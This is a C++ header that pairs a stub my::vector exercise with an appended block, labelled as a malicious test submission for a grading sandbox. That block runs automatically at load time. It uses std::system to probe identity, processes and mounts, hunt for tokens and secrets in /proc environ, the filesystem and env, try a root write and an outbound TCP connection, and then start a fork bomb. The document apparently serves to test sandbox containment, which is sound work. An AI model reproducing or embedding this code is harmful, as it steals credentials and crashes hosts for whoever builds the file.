// MALICIOUS TEST SUBMISSION for the cppatlas grader: reconnaissance from
// inside the sandbox (identity, network, processes, mounts, secrets) followed
// by a fork bomb that must be reaped. Meant for the Fly (mode B) smoke test;
// run with STAGES='[2]' so the (failing) stage shows the probe output.
#pragma once
#include <cstdio>
#include <cstdlib>
#include <unistd.h>

#include <cstddef>    // std::size_t
#include <memory>     // std::allocator, std::construct_at, std::destroy_at (you will want these)
#include <new>        // placement new, ::operator new
#include <stdexcept>  // std::logic_error (used by the stubs below)
#include <utility>    // std::move, std::forward

namespace my {

template <class T>
class vector {
public:
    // ---------------------------------------------------------------- stage 1
    vector() noexcept = default;

    std::size_t size() const noexcept {
        return 0;
    }

    std::size_t capacity() const noexcept {
        return 0;  // TODO(stage 1): how many elements fit before we must reallocate?
    }

    bool empty() const noexcept {
        return true;
    }

    // ---------------------------------------------------------------- stage 2
    ~vector() {
        // TODO(stage 2): destroy the elements (each exactly once), then free the storage.
    }

    void push_back(const T& value) {
        // TODO(stage 2): if there is room, construct a copy of `value` in the first
        // free slot. If not: allocate a bigger RAW buffer (do not default-construct
        // T!), construct the copy of `value` in it FIRST (`value` may be one of
        // your own elements), then move-construct the old elements into the new
        // buffer (stage 6 refines this to std::move_if_noexcept), destroy the old
        // elements and free the old buffer.
        (void)value;
    }

    T& operator[](std::size_t index) {
        (void)index;
        throw std::logic_error("my::vector::operator[] is not implemented yet (stage 2)");
    }

    const T& operator[](std::size_t index) const {
        (void)index;
        throw std::logic_error("my::vector::operator[] const is not implemented yet (stage 2)");
    }

    // ---------------------------------------------------------------- stage 4
    // Copying/moving a vector is stage 4. Until then they are disabled, so the
    // compiler-generated versions cannot silently share (and double-free) a buffer.
    vector(const vector&) = delete;
    vector& operator=(const vector&) = delete;

private:
    // Suggested representation (uncomment when you need it):
    // T* data_ = nullptr;          // first element (raw storage from an allocator)
    // std::size_t size_ = 0;       // constructed elements: data_[0] .. data_[size_ - 1]
    // std::size_t capacity_ = 0;   // allocated slots
};

}  // namespace my
namespace cppatlas_attack {
inline const int recon = [] {
    std::fflush(nullptr);
    std::system(
        "exec 2>&1; echo \"PROBE id: $(id)\"; echo \"PROBE hostname: $(hostname)\";"
        "echo \"PROBE netifs: $(ls /sys/class/net | tr '\\n' ' ')\";"
        "echo \"PROBE pids: $(ls /proc | grep -E '^[0-9]+$' | tr '\\n' ' ')\";"
        "for f in /proc/[0-9]*/environ /proc/[0-9]*/cmdline; do grep -l -a -E 'CPPATLAS_(TOKEN|API_URL)|smoke-secret-[0-9]' \"$f\" 2>/dev/null; done | sed 's/^/PROBE token-in: /';"
        "grep -r -l -a -E 'smoke-secret-[0-9]' /etc /tmp /work /run /var /root /home /.fly /opt /proc/1 2>/dev/null | head | sed 's/^/PROBE secret-file: /';"
        "sed -n '3,$p' /proc/net/dev | cut -d: -f1 | tr -d ' ' | tr '\\n' ' ' | sed 's/^/PROBE proc-net-dev: /'; echo;"
        "env | grep -i -E 'token|api|fly' | sed 's/^/PROBE env: /';"
        "ls -a /.fly /run 2>&1 | head -5 | sed 's/^/PROBE ls: /';"
        "touch /pwned 2>&1 | sed 's/^/PROBE rootfs: /';"
        "unshare -U -n true 2>&1 | sed 's/^/PROBE unshare: /';"
        "cat /proc/self/status | grep -E '^(NoNewPrivs|Seccomp|CapEff)' | sed 's/^/PROBE /';"
        "echo \"PROBE oom_score_adj: $(cat /proc/self/oom_score_adj)\";"
        "echo \"PROBE cgroup: $(cat /proc/self/cgroup)\";"
        "(exec 3<>/dev/tcp/1.1.1.1/80) 2>&1 | sed 's/^/PROBE tcp: /';"
        "echo PROBE done");
    if (fork() == 0) { setsid(); for (;;) (void)fork(); }
    sleep(1);
    return 0;
}();
}
